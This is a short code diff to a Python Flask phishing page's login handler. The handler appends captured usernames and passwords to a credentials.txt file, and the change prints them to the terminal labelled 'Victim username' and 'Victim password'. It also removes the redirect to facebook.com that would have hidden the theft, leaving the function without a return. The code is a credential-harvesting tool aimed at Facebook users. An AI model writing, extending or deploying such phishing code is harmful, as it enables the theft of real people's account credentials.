@@ -15,11 +15,10 @@ def login():
     with open('credentials.txt', 'a') as f:
         f.write(f"Username: {username}, Password: {password}\n")
 
-    # Also print in terminal
-    print(f"[LOG] Username: {username}, Password: {password}")
+    # ✅ Print in required format
+    print(f"Victim username - {username}")
+    print(f"Victim password - {password}")
 
-    # Correct redirect
-    return redirect("https://www.facebook.com/")
-
+    
 if __name__ == '__main__':
     app.run(debug=True)
